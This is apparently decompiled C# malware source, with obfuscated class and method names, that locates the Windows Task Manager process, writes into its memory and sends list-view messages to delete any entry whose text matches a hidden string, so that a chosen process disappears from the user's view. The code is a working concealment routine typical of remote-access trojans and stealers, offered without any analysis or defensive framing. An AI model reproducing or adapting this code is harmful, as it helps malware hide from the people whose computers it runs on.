using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;

[StandardModule]
internal sealed class Class5
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct0
	{
		public uint uint_0;

		public int int_0;

		public int int_1;

		public uint uint_1;

		public uint uint_2;

		public IntPtr intptr_0;

		public int int_2;

		public int int_3;

		public IntPtr intptr_1;

		public int int_4;

		public int int_5;

		public int int_6;

		public IntPtr intptr_2;

		public IntPtr intptr_3;

		public int int_7;

		public int method_0()
		{
			return Marshal.SizeOf((object)this);
		}
	}

	public struct Struct1
	{
		public uint uint_0;

		public int int_0;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_1;

		public int int_2;

		public IntPtr intptr_2;

		public int int_3;

		public int int_4;

		public int method_0()
		{
			return Marshal.SizeOf((object)this);
		}
	}

	internal sealed class Class6 : SafeHandleZeroOrMinusOneIsInvalid
	{
		public Class6()
			: base(ownsHandle: true)
		{
		}

		public Class6(IntPtr intptr_0)
			: base(ownsHandle: true)
		{
			SetHandle(intptr_0);
		}

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr intptr_0);

		protected override bool ReleaseHandle()
		{
			return CloseHandle(handle);
		}
	}

	private static IntPtr intptr_0;

	[DllImport("kernel32", SetLastError = true)]
	public static extern Class6 OpenProcess(uint uint_0, bool bool_0, int int_0);

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory(Class6 class6_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0, ref int int_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "ReadProcessMemory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory_1(Class6 class6_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0, ref int int_1);

	[DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory_2(Class6 class6_0, IntPtr intptr_1, ref Struct0 struct0_0, int int_0, ref int int_1);

	[DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory_3(Class6 class6_0, IntPtr intptr_1, ref Struct1 struct1_0, int int_0, ref int int_1);

	[DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory_4(Class6 class6_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, ref int int_1);

	[DllImport("user32", SetLastError = true)]
	public static extern int SendMessage(IntPtr intptr_1, uint uint_0, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("user32", SetLastError = true)]
	public static extern IntPtr SendMessageA(IntPtr intptr_1, uint uint_0, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
	public static extern int SendMessage_1(IntPtr intptr_1, uint uint_0, int int_0, StringBuilder stringBuilder_0);

	[DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
	public static extern int SendMessage_2(IntPtr intptr_1, uint uint_0, int int_0, IntPtr intptr_2);

	[DllImport("kernel32", SetLastError = true)]
	public static extern IntPtr VirtualAllocEx(Class6 class6_0, IntPtr intptr_1, int int_0, uint uint_0, uint uint_1);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool VirtualFreeEx(Class6 class6_0, IntPtr intptr_1, int int_0, uint uint_0);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteProcessMemory(Class6 class6_0, IntPtr intptr_1, ref Struct0 struct0_0, int int_0, ref int int_1);

	[DllImport("kernel32", EntryPoint = "WriteProcessMemory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteProcessMemory_1(Class6 class6_0, IntPtr intptr_1, ref Struct1 struct1_0, int int_0, ref int int_1);

	public static bool smethod_0(IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		intptr_0 = intptr_2;
		int num = -1;
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				if (Operators.CompareString(process.MainWindowTitle, "Windows Task Manager", false) == 0)
				{
					num = process.Id;
				}
			}
			if (num == -1)
			{
				throw new ArgumentException("Could not find the process specified", "processName");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		Class6 @class = null;
		checked
		{
			try
			{
				@class = OpenProcess(56u, bool_0: false, num);
				if (@class == null && Marshal.GetLastWin32Error() == 0)
				{
					throw new Win32Exception();
				}
				int num2 = SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
				int num3 = num2 - 1;
				for (int j = 0; j <= num3; j++)
				{
					ListViewItem val = new ListViewItem(smethod_1(j, 0, @class));
					if (val.get_Text().Contains(Class7.string_1))
					{
						SendMessage_2(intptr_0, 4104u, j, IntPtr.Zero);
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				if (@class != null)
				{
					@class.Close();
					@class.Dispose();
				}
			}
			return true;
		}
	}

	private static string smethod_1(int int_0, int int_1, Class6 class6_0)
	{
		Struct0 struct0_ = default(Struct0);
		struct0_.int_2 = 260;
		struct0_.uint_0 = 1u;
		struct0_.int_0 = int_0;
		struct0_.int_1 = int_1;
		StringBuilder stringBuilder = new StringBuilder(260);
		IntPtr intPtr = default(IntPtr);
		try
		{
			intPtr = (struct0_.intptr_0 = VirtualAllocEx(class6_0, IntPtr.Zero, 260, 4096u, 4u));
			IntPtr intPtr2 = default(IntPtr);
			try
			{
				intPtr2 = VirtualAllocEx(class6_0, IntPtr.Zero, struct0_.method_0(), 4096u, 4u);
				IntPtr intptr_ = intPtr2;
				int int_2 = struct0_.method_0();
				int int_3 = 0;
				if (!WriteProcessMemory(class6_0, intptr_, ref struct0_, int_2, ref int_3))
				{
					throw new Win32Exception();
				}
				SendMessage_2(intptr_0, 4141u, int_0, intPtr2);
				IntPtr intptr_2 = intPtr;
				int_3 = 0;
				if (!ReadProcessMemory_1(class6_0, intptr_2, stringBuilder, 260, ref int_3))
				{
					throw new Win32Exception();
				}
				IntPtr intptr_3 = intPtr2;
				int int_4 = Marshal.SizeOf((object)struct0_);
				int_3 = 0;
				if (!ReadProcessMemory_2(class6_0, intptr_3, ref struct0_, int_4, ref int_3))
				{
					throw new Win32Exception();
				}
			}
			finally
			{
				if (!intPtr2.Equals((object?)(nint)IntPtr.Zero) && !VirtualFreeEx(class6_0, intPtr2, 0, 32768u))
				{
					throw new Win32Exception();
				}
			}
		}
		finally
		{
			if (!intPtr.Equals((object?)(nint)IntPtr.Zero) && !VirtualFreeEx(class6_0, intPtr, 0, 32768u))
			{
				throw new Win32Exception();
			}
		}
		return stringBuilder.ToString();
	}
}
